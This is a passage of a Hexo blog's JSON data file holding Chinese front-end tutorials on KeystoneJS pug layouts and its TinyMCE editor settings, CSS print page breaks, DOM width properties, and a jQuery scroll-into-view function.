class=\"line\">\t\t\t\t\ta.weixin</span><br><span class=\"line\">\t\t\t\t\ta.gouwuche(href=&apos;&apos;,target=&apos;_blank&apos;)</span><br><span class=\"line\">\t\t\t.nav-center</span><br><span class=\"line\">\t\t\t</span><br><span class=\"line\">\t\t\t\tul.menu</span><br><span class=\"line\">\t\t\t\t\teach link in navLinksCN</span><br><span class=\"line\">\t\t\t\t\t\tli(class=(section == link.key ? &apos;active&apos; : null)): a(href=link.href)= link.label</span><br><span class=\"line\"></span><br><span class=\"line\">\t\t\t\tnav(role=&apos;navigation&apos;).navbar.navbar-default</span><br><span class=\"line\">\t\t\t\t\t.container-fluid</span><br><span class=\"line\">\t\t\t\t\t.navbar-header.text-right</span><br><span class=\"line\">\t\t\t\t\t\tbutton(type=&apos;button&apos;).navbar-toggle</span><br><span class=\"line\">\t\t\t\t\t\t\tspan.sr-only 切换导航</span><br><span class=\"line\">\t\t\t\t\t\t\tspan.icon-bar</span><br><span class=\"line\">\t\t\t\t\t\t\tspan.icon-bar</span><br><span class=\"line\">\t\t\t\t\t\t\tspan.icon-bar</span><br></pre></td></tr></table></figure>\n</li>\n<li><p>添加footer部分代码，如：</p>\n</li>\n</ul>\n<figure class=\"highlight plain\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br><span class=\"line\">17</span><br><span class=\"line\">18</span><br><span class=\"line\">19</span><br><span class=\"line\">20</span><br><span class=\"line\">21</span><br><span class=\"line\">22</span><br><span class=\"line\">23</span><br><span class=\"line\">24</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">//- FOOTER</span><br><span class=\"line\">//- .container: #footer</span><br><span class=\"line\"></span><br><span class=\"line\">.box1.foot#foot</span><br><span class=\"line\">\t.top</span><br><span class=\"line\">\t\t.box2 返回顶部</span><br><span class=\"line\">\t.box2</span><br><span class=\"line\">\t\t.dianshang</span><br><span class=\"line\">\t\t\tspan xxx电商渠道:</span><br><span class=\"line\">\t\t\tp </span><br><span class=\"line\">\t\t\t\ta(href=&quot;http://&quot; target=&quot;_blank&quot;) 天猫</span><br><span class=\"line\">\t\t\t\ta(href=&quot;http://&quot; target=&quot;_blank&quot;) 京东</span><br><span class=\"line\">\t\t\t\ta(href=&quot;http://&quot; target=&quot;_blank&quot;) 苏宁</span><br><span class=\"line\">\t\t\t\ta(href=&quot;http://&quot; target=&quot;_blank&quot;) 微信商城</span><br><span class=\"line\">\t\t.cont</span><br><span class=\"line\">\t\t\t.d1</span><br><span class=\"line\">\t\t\t\timg(src=&apos;../images/ma2.jpg&apos;)</span><br><span class=\"line\">\t\t\t.d2</span><br><span class=\"line\">\t\t\t\tp 正月初五科技有限公司</span><br><span class=\"line\">\t\t\t\tp 联系电话：400-8888-888</span><br><span class=\"line\">\t\t\t\tp 北京市朝阳区朝阳门大街88号</span><br><span class=\"line\">\t\t\t.d3</span><br><span class=\"line\">\t\t\t\timg(src=&apos;../images/ma2.jpg&apos;)</span><br><span class=\"line\">\t\tp.bei ©2014-2017 正月初五   版权所有 | 京ICP备88888888号-1</span><br></pre></td></tr></table></figure>\n<ul>\n<li>最后，把具体views中页面引用的default模板改成main，如：</li>\n</ul>\n<figure class=\"highlight plain\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">extends ../layouts/main</span><br></pre></td></tr></table></figure>\n<p>好了，重启下应用看看效果吧。<br>备注：<br>pug模板引擎中文文档<a href=\"https://pugjs.org/zh-cn/api/getting-started.html\" target=\"_blank\" rel=\"noopener\">pug文档</a>。</p>\n"},{"title":"keystonejs富文本问题及思考过程","date":"2018-04-09T09:31:26.000Z","_content":"上一篇讲了keystonejs的环境搭建，helloworld跑起来之后，实际运用中会发现各种问题，今天就说下富文本编辑器的问题（针对后端不熟的同学）。\n\n不太熟悉网页嵌入富文本编辑器的同学可能和我一样，当实际发博文的时候，发现默认的编辑器好简单，常用的h1,h2,分割线，代码引用等没有对应的按钮。怎么办？我当时的思考过程如下：\n\n**首先**，认为这是作者自己开发的简易文本编辑器，想丰富只能找其他的替代。那就开始重点搜开源的，支持markdown的js富文本编辑器，结果找到了[Editor.md][1]，大概看了下，还是蛮丰富的。\n\n**然后**，开始改造吧，结果找了半天没有找到对应的代码，后来才发现后台admin部分的透明，项目下没有后台相关文件，真是“辛辛苦苦大半年，一朝回到解放前。”\n\n**再然后**，想着要么改造系统级源码，成本太高，要么放弃，折腾半天放弃，太可惜。难道这真的是“鸡肋”吗？不可能啊，star一万多，还是先从自身找原因，继续研究。\n\n**最后**，在文档配置模块下找到了后台UI配置（Configuration>Admin UI Options），原来作者是用的[tinymce][2]，keystonejs文档给了简单的配置说明，详细部分还是参考tinymce官方文档。\n\n备注\n--\n\n默认的样式：\n![图片描述](1.jpg)\n官方配置示例：\n![图片描述](2.jpg)\n![图片描述](3.jpg)\n\n\n  [1]: https://pandao.github.io/editor.md/\n  [2]: https://www.tinymce.com/","source":"_posts/2018/keystonejs富文本问题及思考过程.md","raw":"---\ntitle: keystonejs富文本问题及思考过程\ndate: 2018-04-09 17:31:26\ntags:\n  - keystonejs\n  - cms\ncategories:\n  - 后端\n---\n上一篇讲了keystonejs的环境搭建，helloworld跑起来之后，实际运用中会发现各种问题，今天就说下富文本编辑器的问题（针对后端不熟的同学）。\n\n不太熟悉网页嵌入富文本编辑器的同学可能和我一样，当实际发博文的时候，发现默认的编辑器好简单，常用的h1,h2,分割线，代码引用等没有对应的按钮。怎么办？我当时的思考过程如下：\n\n**首先**，认为这是作者自己开发的简易文本编辑器，想丰富只能找其他的替代。那就开始重点搜开源的，支持markdown的js富文本编辑器，结果找到了[Editor.md][1]，大概看了下，还是蛮丰富的。\n\n**然后**，开始改造吧，结果找了半天没有找到对应的代码，后来才发现后台admin部分的透明，项目下没有后台相关文件，真是“辛辛苦苦大半年，一朝回到解放前。”\n\n**再然后**，想着要么改造系统级源码，成本太高，要么放弃，折腾半天放弃，太可惜。难道这真的是“鸡肋”吗？不可能啊，star一万多，还是先从自身找原因，继续研究。\n\n**最后**，在文档配置模块下找到了后台UI配置（Configuration>Admin UI Options），原来作者是用的[tinymce][2]，keystonejs文档给了简单的配置说明，详细部分还是参考tinymce官方文档。\n\n备注\n--\n\n默认的样式：\n![图片描述](1.jpg)\n官方配置示例：\n![图片描述](2.jpg)\n![图片描述](3.jpg)\n\n\n  [1]: https://pandao.github.io/editor.md/\n  [2]: https://www.tinymce.com/","slug":"2018-keystonejs富文本问题及思考过程","published":1,"updated":"2019-05-17T02:47:28.957Z","comments":1,"layout":"post","photos":[],"link":"","_id":"ck0m3d8rq001ywovv05zs3pte","content":"<p>上一篇讲了keystonejs的环境搭建，helloworld跑起来之后，实际运用中会发现各种问题，今天就说下富文本编辑器的问题（针对后端不熟的同学）。</p>\n<p>不太熟悉网页嵌入富文本编辑器的同学可能和我一样，当实际发博文的时候，发现默认的编辑器好简单，常用的h1,h2,分割线，代码引用等没有对应的按钮。怎么办？我当时的思考过程如下：</p>\n<p><strong>首先</strong>，认为这是作者自己开发的简易文本编辑器，想丰富只能找其他的替代。那就开始重点搜开源的，支持markdown的js富文本编辑器，结果找到了<a href=\"https://pandao.github.io/editor.md/\" target=\"_blank\" rel=\"noopener\">Editor.md</a>，大概看了下，还是蛮丰富的。</p>\n<p><strong>然后</strong>，开始改造吧，结果找了半天没有找到对应的代码，后来才发现后台admin部分的透明，项目下没有后台相关文件，真是“辛辛苦苦大半年，一朝回到解放前。”</p>\n<p><strong>再然后</strong>，想着要么改造系统级源码，成本太高，要么放弃，折腾半天放弃，太可惜。难道这真的是“鸡肋”吗？不可能啊，star一万多，还是先从自身找原因，继续研究。</p>\n<p><strong>最后</strong>，在文档配置模块下找到了后台UI配置（Configuration&gt;Admin UI Options），原来作者是用的<a href=\"https://www.tinymce.com/\" target=\"_blank\" rel=\"noopener\">tinymce</a>，keystonejs文档给了简单的配置说明，详细部分还是参考tinymce官方文档。</p>\n<h2 id=\"备注\"><a href=\"#备注\" class=\"headerlink\" title=\"备注\"></a>备注</h2><p>默认的样式：<br><img src=\"/2018-keystonejs富文本问题及思考过程/1.jpg\" alt=\"图片描述\"><br>官方配置示例：<br><img src=\"/2018-keystonejs富文本问题及思考过程/2.jpg\" alt=\"图片描述\"><br><img src=\"/2018-keystonejs富文本问题及思考过程/3.jpg\" alt=\"图片描述\"></p>\n","site":{"data":{}},"excerpt":"","more":"<p>上一篇讲了keystonejs的环境搭建，helloworld跑起来之后，实际运用中会发现各种问题，今天就说下富文本编辑器的问题（针对后端不熟的同学）。</p>\n<p>不太熟悉网页嵌入富文本编辑器的同学可能和我一样，当实际发博文的时候，发现默认的编辑器好简单，常用的h1,h2,分割线，代码引用等没有对应的按钮。怎么办？我当时的思考过程如下：</p>\n<p><strong>首先</strong>，认为这是作者自己开发的简易文本编辑器，想丰富只能找其他的替代。那就开始重点搜开源的，支持markdown的js富文本编辑器，结果找到了<a href=\"https://pandao.github.io/editor.md/\" target=\"_blank\" rel=\"noopener\">Editor.md</a>，大概看了下，还是蛮丰富的。</p>\n<p><strong>然后</strong>，开始改造吧，结果找了半天没有找到对应的代码，后来才发现后台admin部分的透明，项目下没有后台相关文件，真是“辛辛苦苦大半年，一朝回到解放前。”</p>\n<p><strong>再然后</strong>，想着要么改造系统级源码，成本太高，要么放弃，折腾半天放弃，太可惜。难道这真的是“鸡肋”吗？不可能啊，star一万多，还是先从自身找原因，继续研究。</p>\n<p><strong>最后</strong>，在文档配置模块下找到了后台UI配置（Configuration&gt;Admin UI Options），原来作者是用的<a href=\"https://www.tinymce.com/\" target=\"_blank\" rel=\"noopener\">tinymce</a>，keystonejs文档给了简单的配置说明，详细部分还是参考tinymce官方文档。</p>\n<h2 id=\"备注\"><a href=\"#备注\" class=\"headerlink\" title=\"备注\"></a>备注</h2><p>默认的样式：<br><img src=\"/2018-keystonejs富文本问题及思考过程/1.jpg\" alt=\"图片描述\"><br>官方配置示例：<br><img src=\"/2018-keystonejs富文本问题及思考过程/2.jpg\" alt=\"图片描述\"><br><img src=\"/2018-keystonejs富文本问题及思考过程/3.jpg\" alt=\"图片描述\"></p>\n"},{"title":"网页打印实践及参考资料推荐","date":"2018-04-25T09:11:06.000Z","_content":">难度系数：简单\n关键词：css print\n\n# 实践\n处理前截图：\n![图片描述][1]\n处理后截图：\n![图片描述][2]\n## 实践小结\n第一次接到网页要提供打印，可能会有些不知所措，我这里只说下遇到表格、图像、列表项内容在尾部被断开的问题处理。\n1. 方案选用的是直接调用[window.print()](https://developer.mozilla.org/en-US/docs/Web/API/Window/print)方法;\n2. 本次用到的只是处理固定块内容不被截断，对于不想被断开的元素设置css值`page-break-inside: avoid`，例如：\n```\n.vo-cnt-list{\n    li{\n        page-break-inside: avoid;\n    }\n}\n```\n# 备注\n需要了解更详细的，可以参考[ web打印的几种方案 ](https://blog.csdn.net/a89004088/article/details/78362915)和[打印样式设计 ](https://www.w3cplus.com/css/designing-for-print-with-css.html)。\n\n\n  [1]: print1.jpg\n  [2]: print2.jpg","source":"_posts/2018/print.md","raw":"---\ntitle: 网页打印实践及参考资料推荐\ndate: 2018-04-25 17:11:06\ntags:\n  - CSS\ncategories:\n  - 前端\n---\n>难度系数：简单\n关键词：css print\n\n# 实践\n处理前截图：\n![图片描述][1]\n处理后截图：\n![图片描述][2]\n## 实践小结\n第一次接到网页要提供打印，可能会有些不知所措，我这里只说下遇到表格、图像、列表项内容在尾部被断开的问题处理。\n1. 方案选用的是直接调用[window.print()](https://developer.mozilla.org/en-US/docs/Web/API/Window/print)方法;\n2. 本次用到的只是处理固定块内容不被截断，对于不想被断开的元素设置css值`page-break-inside: avoid`，例如：\n```\n.vo-cnt-list{\n    li{\n        page-break-inside: avoid;\n    }\n}\n```\n# 备注\n需要了解更详细的，可以参考[ web打印的几种方案 ](https://blog.csdn.net/a89004088/article/details/78362915)和[打印样式设计 ](https://www.w3cplus.com/css/designing-for-print-with-css.html)。\n\n\n  [1]: print1.jpg\n  [2]: print2.jpg","slug":"2018-print","published":1,"updated":"2019-05-17T02:47:27.583Z","comments":1,"layout":"post","photos":[],"link":"","_id":"ck0m3d8rv0020wovva1l9v60h","content":"<blockquote>\n<p>难度系数：简单<br>关键词：css print</p>\n</blockquote>\n<h1 id=\"实践\"><a href=\"#实践\" class=\"headerlink\" title=\"实践\"></a>实践</h1><p>处理前截图：<br><img src=\"/2018-print/print1.jpg\" alt=\"图片描述\"><br>处理后截图：<br><img src=\"/2018-print/print2.jpg\" alt=\"图片描述\"></p>\n<h2 id=\"实践小结\"><a href=\"#实践小结\" class=\"headerlink\" title=\"实践小结\"></a>实践小结</h2><p>第一次接到网页要提供打印，可能会有些不知所措，我这里只说下遇到表格、图像、列表项内容在尾部被断开的问题处理。</p>\n<ol>\n<li>方案选用的是直接调用<a href=\"https://developer.mozilla.org/en-US/docs/Web/API/Window/print\" target=\"_blank\" rel=\"noopener\">window.print()</a>方法;</li>\n<li>本次用到的只是处理固定块内容不被截断，对于不想被断开的元素设置css值<code>page-break-inside: avoid</code>，例如：<figure class=\"highlight plain\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">.vo-cnt-list&#123;</span><br><span class=\"line\">    li&#123;</span><br><span class=\"line\">        page-break-inside: avoid;</span><br><span class=\"line\">    &#125;</span><br><span class=\"line\">&#125;</span><br></pre></td></tr></table></figure>\n</li>\n</ol>\n<h1 id=\"备注\"><a href=\"#备注\" class=\"headerlink\" title=\"备注\"></a>备注</h1><p>需要了解更详细的，可以参考<a href=\"https://blog.csdn.net/a89004088/article/details/78362915\" target=\"_blank\" rel=\"noopener\"> web打印的几种方案 </a>和<a href=\"https://www.w3cplus.com/css/designing-for-print-with-css.html\" target=\"_blank\" rel=\"noopener\">打印样式设计 </a>。</p>\n","site":{"data":{}},"excerpt":"","more":"<blockquote>\n<p>难度系数：简单<br>关键词：css print</p>\n</blockquote>\n<h1 id=\"实践\"><a href=\"#实践\" class=\"headerlink\" title=\"实践\"></a>实践</h1><p>处理前截图：<br><img src=\"/2018-print/print1.jpg\" alt=\"图片描述\"><br>处理后截图：<br><img src=\"/2018-print/print2.jpg\" alt=\"图片描述\"></p>\n<h2 id=\"实践小结\"><a href=\"#实践小结\" class=\"headerlink\" title=\"实践小结\"></a>实践小结</h2><p>第一次接到网页要提供打印，可能会有些不知所措，我这里只说下遇到表格、图像、列表项内容在尾部被断开的问题处理。</p>\n<ol>\n<li>方案选用的是直接调用<a href=\"https://developer.mozilla.org/en-US/docs/Web/API/Window/print\" target=\"_blank\" rel=\"noopener\">window.print()</a>方法;</li>\n<li>本次用到的只是处理固定块内容不被截断，对于不想被断开的元素设置css值<code>page-break-inside: avoid</code>，例如：<figure class=\"highlight plain\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">.vo-cnt-list&#123;</span><br><span class=\"line\">    li&#123;</span><br><span class=\"line\">        page-break-inside: avoid;</span><br><span class=\"line\">    &#125;</span><br><span class=\"line\">&#125;</span><br></pre></td></tr></table></figure>\n</li>\n</ol>\n<h1 id=\"备注\"><a href=\"#备注\" class=\"headerlink\" title=\"备注\"></a>备注</h1><p>需要了解更详细的，可以参考<a href=\"https://blog.csdn.net/a89004088/article/details/78362915\" target=\"_blank\" rel=\"noopener\"> web打印的几种方案 </a>和<a href=\"https://www.w3cplus.com/css/designing-for-print-with-css.html\" target=\"_blank\" rel=\"noopener\">打印样式设计 </a>。</p>\n"},{"title":"width、naturalWidth、clientWidth、offsetWidth区别整理","date":"2018-04-08T12:24:31.000Z","_content":"今天在做图片裁剪功能的时候，参考了下网友的资料，发现大家对图片宽度的获取方式不尽相同，于是详细整理下各个属性的区别（详细请参考[MDN](https://developer.mozilla.org/zh-CN/docs/Web/API)）。\n\n1，`HTMLImageElement.width`是一个`unsigned long` 类型反映了 [`width` ](https://developer.mozilla.org/zh-CN/docs/Web/HTML/Element/img#attr-width)HTML 属性, 说明图像在CSS像素中渲染的宽度。\n\n2，`HTMLImageElement.naturalWidth`返回一个 `unsigned long` 类型,表明图像在CSS像素中固有的宽度,如果可用的话； 否则, 返回`0`。\n\n3，`Element.clientWidth` 属性表示元素的内部宽度，以像素计。该属性包括内边距，但不包括垂直滚动条（如果有）、边框和外边距。该属性值会被四舍五入为一个整数。如果你需要一个小数值，可使用 [`element.getBoundingClientRect()`](https://developer.mozilla.org/zh-CN/docs/Web/API/Element/getBoundingClientRect \"Element.getBoundingClientRect()方法返回元素的大小及其相对于视口的位置。\")。\n![clientWidth](clientWidth.png)\n\n4，`HTMLElement.offsetWidth` 是一个只读属性，返回一个元素的布局宽度。一个典型的（译者注：各浏览器的offsetWidth可能有所不同）offsetWidth是测量包含元素的边框(border)、水平线上的内边距(padding)、竖直方向滚动条(scrollbar)（如果存在的话）、以及CSS设置的宽度(width)的值。\n![offsetWidth](offsetWidth.png)","source":"_posts/2018/width、naturalWidth、clientWidth、offsetWidth区别整理.md","raw":"---\ntitle: width、naturalWidth、clientWidth、offsetWidth区别整理\ndate: 2018-04-08 20:24:31\ntags:\n  - HTML\ncategories:\n  - 前端\n---\n今天在做图片裁剪功能的时候，参考了下网友的资料，发现大家对图片宽度的获取方式不尽相同，于是详细整理下各个属性的区别（详细请参考[MDN](https://developer.mozilla.org/zh-CN/docs/Web/API)）。\n\n1，`HTMLImageElement.width`是一个`unsigned long` 类型反映了 [`width` ](https://developer.mozilla.org/zh-CN/docs/Web/HTML/Element/img#attr-width)HTML 属性, 说明图像在CSS像素中渲染的宽度。\n\n2，`HTMLImageElement.naturalWidth`返回一个 `unsigned long` 类型,表明图像在CSS像素中固有的宽度,如果可用的话； 否则, 返回`0`。\n\n3，`Element.clientWidth` 属性表示元素的内部宽度，以像素计。该属性包括内边距，但不包括垂直滚动条（如果有）、边框和外边距。该属性值会被四舍五入为一个整数。如果你需要一个小数值，可使用 [`element.getBoundingClientRect()`](https://developer.mozilla.org/zh-CN/docs/Web/API/Element/getBoundingClientRect \"Element.getBoundingClientRect()方法返回元素的大小及其相对于视口的位置。\")。\n![clientWidth](clientWidth.png)\n\n4，`HTMLElement.offsetWidth` 是一个只读属性，返回一个元素的布局宽度。一个典型的（译者注：各浏览器的offsetWidth可能有所不同）offsetWidth是测量包含元素的边框(border)、水平线上的内边距(padding)、竖直方向滚动条(scrollbar)（如果存在的话）、以及CSS设置的宽度(width)的值。\n![offsetWidth](offsetWidth.png)","slug":"2018-width、naturalWidth、clientWidth、offsetWidth区别整理","published":1,"updated":"2019-05-17T02:47:24.049Z","comments":1,"layout":"post","photos":[],"link":"","_id":"ck0m3d8rz0024wovvcyk0thlv","content":"<p>今天在做图片裁剪功能的时候，参考了下网友的资料，发现大家对图片宽度的获取方式不尽相同，于是详细整理下各个属性的区别（详细请参考<a href=\"https://developer.mozilla.org/zh-CN/docs/Web/API\" target=\"_blank\" rel=\"noopener\">MDN</a>）。</p>\n<p>1，<code>HTMLImageElement.width</code>是一个<code>unsigned long</code> 类型反映了 <a href=\"https://developer.mozilla.org/zh-CN/docs/Web/HTML/Element/img#attr-width\" target=\"_blank\" rel=\"noopener\"><code>width</code> </a>HTML 属性, 说明图像在CSS像素中渲染的宽度。</p>\n<p>2，<code>HTMLImageElement.naturalWidth</code>返回一个 <code>unsigned long</code> 类型,表明图像在CSS像素中固有的宽度,如果可用的话； 否则, 返回<code>0</code>。</p>\n<p>3，<code>Element.clientWidth</code> 属性表示元素的内部宽度，以像素计。该属性包括内边距，但不包括垂直滚动条（如果有）、边框和外边距。该属性值会被四舍五入为一个整数。如果你需要一个小数值，可使用 <a href=\"https://developer.mozilla.org/zh-CN/docs/Web/API/Element/getBoundingClientRect\" title=\"Element.getBoundingClientRect()方法返回元素的大小及其相对于视口的位置。\" target=\"_blank\" rel=\"noopener\"><code>element.getBoundingClientRect()</code></a>。<br><img src=\"/2018-width、naturalWidth、clientWidth、offsetWidth区别整理/clientWidth.png\" alt=\"clientWidth\"></p>\n<p>4，<code>HTMLElement.offsetWidth</code> 是一个只读属性，返回一个元素的布局宽度。一个典型的（译者注：各浏览器的offsetWidth可能有所不同）offsetWidth是测量包含元素的边框(border)、水平线上的内边距(padding)、竖直方向滚动条(scrollbar)（如果存在的话）、以及CSS设置的宽度(width)的值。<br><img src=\"/2018-width、naturalWidth、clientWidth、offsetWidth区别整理/offsetWidth.png\" alt=\"offsetWidth\"></p>\n","site":{"data":{}},"excerpt":"","more":"<p>今天在做图片裁剪功能的时候，参考了下网友的资料，发现大家对图片宽度的获取方式不尽相同，于是详细整理下各个属性的区别（详细请参考<a href=\"https://developer.mozilla.org/zh-CN/docs/Web/API\" target=\"_blank\" rel=\"noopener\">MDN</a>）。</p>\n<p>1，<code>HTMLImageElement.width</code>是一个<code>unsigned long</code> 类型反映了 <a href=\"https://developer.mozilla.org/zh-CN/docs/Web/HTML/Element/img#attr-width\" target=\"_blank\" rel=\"noopener\"><code>width</code> </a>HTML 属性, 说明图像在CSS像素中渲染的宽度。</p>\n<p>2，<code>HTMLImageElement.naturalWidth</code>返回一个 <code>unsigned long</code> 类型,表明图像在CSS像素中固有的宽度,如果可用的话； 否则, 返回<code>0</code>。</p>\n<p>3，<code>Element.clientWidth</code> 属性表示元素的内部宽度，以像素计。该属性包括内边距，但不包括垂直滚动条（如果有）、边框和外边距。该属性值会被四舍五入为一个整数。如果你需要一个小数值，可使用 <a href=\"https://developer.mozilla.org/zh-CN/docs/Web/API/Element/getBoundingClientRect\" title=\"Element.getBoundingClientRect()方法返回元素的大小及其相对于视口的位置。\" target=\"_blank\" rel=\"noopener\"><code>element.getBoundingClientRect()</code></a>。<br><img src=\"/2018-width、naturalWidth、clientWidth、offsetWidth区别整理/clientWidth.png\" alt=\"clientWidth\"></p>\n<p>4，<code>HTMLElement.offsetWidth</code> 是一个只读属性，返回一个元素的布局宽度。一个典型的（译者注：各浏览器的offsetWidth可能有所不同）offsetWidth是测量包含元素的边框(border)、水平线上的内边距(padding)、竖直方向滚动条(scrollbar)（如果存在的话）、以及CSS设置的宽度(width)的值。<br><img src=\"/2018-width、naturalWidth、clientWidth、offsetWidth区别整理/offsetWidth.png\" alt=\"offsetWidth\"></p>\n"},{"title":"产品条目不在可视区域的处理","date":"2018-04-17T10:23:05.000Z","_content":"> 难度系数：简单\n\n> 关键词：length outerHeight position   \n\n# 前言\n案例很简单，但是对于初学者可以延伸学习下jquery的相关知识点：\n1. 判断选择的元素是否存在用`length`;\n2. 获取元素的高度height()与outerHeight()的异同；\n3. 判断元素位置position()与offset()的异同。\n\n# 应用场景：\n在做动态创建目录的时候，选择的条目不在可视区域，如图：\n![场景图](selectedInView.jpg)\n\n默认情况滚动条都是在最上面的，导致超出可视区域的选择条目没有呈现在可视区域，因此要脚本处理下。代码很简单，如下：\n## 设置父容器相对定位\n```\nul{\n    postion:relative;\n}\n```\n## 动态创建完dom结构后调用函数\n```\nfunction setSelectedInView(){\n    $('.J-item.selected').each(function(){\n        var $this = $(this);\n        if($this.length > 0){\n            var $item = $this.parent(),\n                itemHeight = $item.outerHeight(),\n                itemTop = $item.position().top;\n            var $container = $item.parent('.J-items'),\n                containerHeight = $container.height();\n            // 如果该条目元素相对于父级的位置超出可视框高度，设置滚动条\n            if(itemTop > containerHeight){\n                $container.scrollTop(itemTop - containerHeight + itemHeight);\n            }\n        }\n    })\n}\n```","source":"_posts/2018/selectedInView.md","raw":"---\ntitle: 产品条目不在可视区域的处理\ndate: 2018-04-17 18:23:05\ntags:\n  - JavaScript\ncategories:\n  - 前端\n---\n> 难度系数：简单\n\n> 关键词：length outerHeight position   \n\n# 前言\n案例很简单，但是对于初学者可以延伸学习下jquery的相关知识点：\n1. 判断选择的元素是否存在用`length`;\n2. 获取元素的高度height()与outerHeight()的异同；\n3. 判断元素位置position()与offset()的异同。\n\n# 应用场景：\n在做动态创建目录的时候，选择的条目不在可视区域，如图：\n![场景图](selectedInView.jpg)\n\n默认情况滚动条都是在最上面的，导致超出可视区域的选择条目没有呈现在可视区域，因此要脚本处理下。代码很简单，如下：\n## 设置父容器相对定位\n```\nul{\n    postion:relative;\n}\n```\n## 动态创建完dom结构后调用函数\n```\nfunction setSelectedInView(){\n    $('.J-item.selected').each(function(){\n        var $this = $(this);\n        if($this.length > 0){\n            var $item = $this.parent(),\n                itemHeight = $item.outerHeight(),\n                itemTop = $item.position().top;\n            var $container = $item.parent('.J-items'),\n                containerHeight = $container.height();\n            // 如果该条目元素相对于父级的位置超出可视框高度，设置滚动条\n            if(itemTop > containerHeight){\n                $container.scrollTop(itemTop - containerHeight + itemHeight);\n            }\n        }\n    })\n}\n```","slug":"2018-selectedInView","published":1,"updated":"2019-05-17T02:47:26.133Z","comments":1,"layout":"post","photos":[],"link":"","_id":"ck0m3d8uw0041wovv3yyzrms8","content":"<blockquote>\n<p>难度系数：简单</p>\n</blockquote>\n<blockquote>\n<p>关键词：length outerHeight position   </p>\n</blockquote>\n<h1 id=\"前言\"><a href=\"#前言\" class=\"headerlink\" title=\"前言\"></a>前言</h1><p>案例很简单，但是对于初学者可以延伸学习下jquery的相关知识点：</p>\n<ol>\n<li>判断选择的元素是否存在用<code>length</code>;</li>\n<li>获取元素的高度height()与outerHeight()的异同；</li>\n<li>判断元素位置position()与offset()的异同。</li>\n</ol>\n<h1 id=\"应用场景：\"><a href=\"#应用场景：\" class=\"headerlink\" title=\"应用场景：\"></a>应用场景：</h1><p>在做动态创建目录的时候，选择的条目不在可视区域，如图：<br><img src=\"/2018-selectedInView/selectedInView.jpg\" alt=\"场景图\"></p>\n<p>默认情况滚动条都是在最上面的，导致超出可视区域的选择条目没有呈现在可视区域，因此要脚本处理下。代码很简单，如下：</p>\n<h2 id=\"设置父容器相对定位\"><a href=\"#设置父容器相对定位\" class=\"headerlink\" title=\"设置父容器相对定位\"></a>设置父容器相对定位</h2><figure class=\"highlight plain\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">ul&#123;</span><br><span class=\"line\">    postion:relative;</span><br><span class=\"line\">&#125;</span><br></pre></td></tr></table></figure>\n<h2 id=\"动态创建完dom结构后调用函数\"><a href=\"#动态创建完dom结构后调用函数\" class=\"headerlink\" title=\"动态创建完dom结构后调用函数\"></a>动态创建完dom结构后调用函数</h2><figure class=\"highlight plain\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">function setSelectedInView()&#123;</span><br><span class=\"line\">    $(&apos;.J-item.selected&apos;).each(function()&#123;</span><br><span class=\"line\">        var $this = $(this);</span><br><span class=\"line\">        if($this.length &gt; 0)&#123;</span><br><span class=\"line\">            var $item = $this.parent(),</span><br><span class=\"line\">                itemHeight = $item.outerHeight(),</span><br><span class=\"line\">                itemTop = $item.position().top;</span><br><span class=\"line\">            var $container = $item.parent(&apos;.J-items&apos;),</span><br><span class=\"line\">                containerHeight = $container.height();</span><br><span class=\"line\">            // 如果该条目元素相对于父级的位置超出可视框高度，设置滚动条</span><br><span class=\"line\">            if(itemTop &gt; containerHeight)&#123;</span><br><span class=\"line\">                $container.scrollTop(itemTop - containerHeight + itemHeight);</span><br><span class=\"line\">            &#125;</span><br><span class=\"line\">        &#125;</span><br><span class=\"line\">    &#125;)</span><br><span class=\"line\">&#125;</span><br></pre></td></tr></table></figure>","site":{"data":{}},"excerpt":"","more":"<blockquote>\n<p>难度系数：简单</p>\n</blockquote>\n<blockquote>\n<p>关键词：length outerHeight position   </p>\n</blockquote>\n<h1 id=\"前言\"><a href=\"#前言\" class=\"headerlink\" title=\"前言\"></a>前言</h1><p>案例很简单，但是对于初学者可以延伸学习下jquery的相关知识点：</p>\n<ol>\n<li>判断选择的元素是否存在用<code>length</code>;</li>\n<li>获取元素的高度height()与outerHeight()的异同；</li>\n<li>判断元素位置position()与offset()的异同。</li>\n</ol>\n<h1 id=\"应用场景：\"><a href=\"#应用场景：\" class=\"headerlink\" title=\"应用场景：\"></a>应用场景：</h1><p>在做动态创建目录的时候，选择的条目不在可视区域，如图：<br><img src=\"/2018-selectedInView/selectedInView.jpg\" alt=\"场景图\"></p>\n<p>默认情况滚动条都是在最上面的，导致超出可视区域的选择条目没有呈现在可视区域，因此要脚本处理下。代码很简单，如下：</p>\n<h2 id=\"设置父容器相对定位\"><a href=\"#设置父容器相对定位\" class=\"headerlink\" title=\"设置父容器相对定位\"></a>设置父容器相对定位</h2><figure class=\"highlight plain\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span 